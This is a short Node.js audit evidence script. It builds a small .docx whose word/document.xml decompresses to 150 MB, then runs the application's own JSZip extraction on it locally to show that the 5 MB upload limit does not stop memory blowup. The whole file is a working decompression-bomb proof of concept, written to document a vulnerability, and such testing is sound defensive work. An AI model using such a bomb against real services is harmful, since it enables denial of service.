// Audit evidence script. Run from the repository root:  node docs/audit-evidence/08-docx-bomb.js
// Read-only: it never modifies the repository. Needs Node 20+ and `npm install` in backend/ (and frontend/ for 04).
const REPO = require('node:path').resolve(__dirname, '../..').split(require('node:path').sep).join('/');
// A tiny .docx whose word/document.xml expands to 150 MB. The app's extraction code:
//   const zip = await JSZip.loadAsync(buffer); await zip.file('word/document.xml').async('string')
const path = require('path');
const JSZip = require(path.join((REPO + '/backend'), 'node_modules/jszip'));

(async () => {
  const big = Buffer.alloc(150 * 1024 * 1024, 'a'); // 150 MB of one repeated byte
  const bomb = new JSZip();
  bomb.file('word/document.xml', big, { compression: 'DEFLATE', compressionOptions: { level: 9 } });
  const upload = await bomb.generateAsync({ type: 'nodebuffer' });
  console.log(`file the user uploads: ${(upload.length / 1024).toFixed(0)} KB (limit is 5120 KB)`);

  const before = process.memoryUsage().rss;
  const t = Date.now();
  const zip = await JSZip.loadAsync(upload);
  const xml = await zip.file('word/document.xml').async('string');
  const cleaned = xml.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
  console.log(`extracted ${(xml.length / 1048576).toFixed(0)} MB of text in ${Date.now() - t} ms; process RSS grew by ${((process.memoryUsage().rss - before) / 1048576).toFixed(0)} MB (result ${cleaned.length} chars)`);
  process.exit(0);
})();
